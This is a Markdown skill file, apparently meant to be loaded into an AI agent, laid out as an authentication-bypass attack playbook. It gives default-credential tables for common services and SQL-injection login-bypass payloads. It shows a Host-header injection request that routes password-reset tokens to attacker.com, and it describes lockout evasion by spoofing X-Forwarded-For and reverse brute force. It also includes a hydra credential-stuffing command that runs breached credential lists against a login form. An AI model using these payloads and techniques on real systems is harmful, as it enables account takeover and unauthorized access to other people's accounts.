For other original section numbers, use the [entry index](../SKILL.md#references).


# SKILL: Authentication Bypass — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication bypass techniques. Covers SQL injection-based login bypass, password reset flaws, token predictability, account enumeration, brute force bypass, and multi-factor auth bypass. Distinct from JWT/OAuth (covered in ../jwt-oauth-token-attacks/SKILL.md). Focus on the login mechanism itself.

## 0. AUTHORIZED CREDENTIAL TEST PLANNING

After reducing routing entries, default credentials, username variants, port focus, and wordlist sizing are handled here in one place.

### Service-first tiny sets

| Service Type | First Usernames | First Passwords |
|---|---|---|
| phpMyAdmin | `root`, `admin` | empty, `root`, `phpmyadmin`, `admin` |
| FTP | `ftp`, `admin`, `test` | empty, `ftp`, `admin`, `123456` |
| SSH | `root`, `admin`, service account names | `root`, `admin`, seasonal variants |
| MySQL | `root`, `mysql` | empty, `root`, `mysql` |
| Tomcat / Java admin | `tomcat`, `admin`, `manager` | `tomcat`, `admin`, `s3cret` |
| WebLogic | `weblogic`, `admin` | `weblogic`, `welcome1`, `admin` |

### Username classes

| Class | Examples |
|---|---|
| Generic admins | `admin`, `administrator`, `root`, `test`, `guest` |
| Support / ops | `dev`, `ops`, `sysadmin`, `service`, `backup` |
| Name-based | `firstname`, `lastname`, `f.lastname`, `first.last` |
| Mail-derived | left side of corporate email formats |
| Product-based | `tomcat`, `weblogic`, `jenkins`, `gitlab` |

### Wordlist sizing and port focus

| Scenario | Preferred Size | Why |
|---|---|---|
| Default admin panel | 5 to 50 passwords | Defaults beat giant lists here |
| Internal service with known product | vendor-specific small set | Better signal than generic lists |
| Consumer login with weak controls | Top 20 or Top 100 | Fast verification |
| Rate-limited login | tiny list + header/rotation strategy | Preserve attempts |
| Offline hash cracking | large dictionaries | Online brute rules do not apply |

Prioritize common ports and service surfaces: 80/443/8080/8443 admin panels, 22 SSH, 21 FTP, and 3306/5432/6379/27017 data or management services.

---

## 1. SQL INJECTION LOGIN BYPASS

Classic but still found in legacy systems, custom ORMs, and raw query code:

```sql
-- Basic bypass (admin user assumed first row):
Username: admin'--
Password: anything
→ Query: SELECT * FROM users WHERE user='admin'--' AND pass='anything'

-- Generic bypass (logs in as first user in DB):
Username: ' OR '1'='1'--
Password: anything
→ Query: SELECT * FROM users WHERE user='' OR '1'='1'--' AND pass='anything'

-- Blind: does this work?
Username: ' OR 1=1--
Username: admin' OR 'a'='a
Username: 1' OR '1'='1'/*
Username: 1 or 1=1
```

**Test each field separately** — only one field may be vulnerable.

---

## 2. PASSWORD RESET VULNERABILITIES

### Guessable / Predictable Reset Tokens

Check if reset token is based on:
```
- Timestamp: token=1691234567890 (Unix time)
- Sequential: token=1001, 1002, 1003
- MD5(email): echo -n "user@example.com" | md5sum
- MD5(username+timestamp): reversible
- Short token (4-6 digits): brute-forceable
```

**Test**: Request 3 consecutive reset emails, compare token patterns.

### Reset Token Not Expiring
```
1. Request password reset → get token via email
2. Wait 48+ hours (token should expire)
3. Use old token → does it work?
```

### Reset Token Reuse
```
1. Request reset → get token T1
2. Complete reset with T1
3. Use T1 again → does it work again?
```

### Host Header Injection in Reset Email
When application generates reset URL using `Host` header:
```http
POST /forgot-password HTTP/1.1
Host: attacker.com           ← inject attacker's domain
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
→ Reset email sent to victim with link pointing to `attacker.com/reset?token=VICTIM_TOKEN`
→ Victim clicks → token captured by attacker

**Test**: Send password reset with modified `Host:`, check email for where reset link points.

### Password Reset Token in Referer
```
1. Request reset → go to reset URL with token
2. Reset page loads third-party resources (analytics, fonts)
→ Referer header leaks: https://target.com/reset?token=TOKEN
→ Third-party server receives token in logs
```

### Password Change Without Current Password
```
PUT /api/user/password
{"new_password": "hacked"}
→ No current_password field required?
→ Combine with CSRF for account takeover
```

---

## 3. ACCOUNT ENUMERATION

Identifying valid usernames/emails enables targeted attacks:

### Error Message Difference
```
Invalid username → "User not found"
Valid username, wrong pass → "Incorrect password"
→ Enumerate valid accounts
```

### Response Time Difference
```
Invalid username → fast response (no DB lookup)
Valid username → slightly slower (DB lookup + hash comparison)
→ Timing oracle
```

### Password Reset Flow
```
POST /forgot-password {"email": "nonexistent@example.com"}
→ "If this email exists, we sent a reset link" (proper)
vs.
→ "This email is not registered" (enumeration possible)
```

### Registration Endpoint
```
POST /register {"email": "victim@example.com"}
→ "Email already registered" → confirms account exists
vs.
→ "Verification email sent" for both → no enumeration
```

---

## 4. BRUTE FORCE BYPASS

### Lockout After N Attempts Then Resets
```
Lockout at 10 attempts → try 9 wrong passwords → lock
Wait for reset period (usually 30 min or 1 hour)
→ Try 9 more → repeat → no permanent lockout
```

### IP-Based Lockout Bypass
```
X-Forwarded-For: 1.1.1.1       ← change each request
X-Real-IP: 2.2.2.2
Rotate through IPs in header
```

### Username Cycling vs Password Cycling
```
Normal brute: try many passwords for one user → lock
Reverse brute: try ONE password for many users
→ "password123" against all users → find those with weak password
→ No single account locked out
```

### Credential Stuffing
Use breached credentials from HaveIBeenPwned datasets against target:
```bash
# Tools: Hydra, Burp Intruder, custom scripts
hydra -C credentials.txt https-post-form://target.com/login:"username=^USER^&password=^PASS^":"error message"
```

---

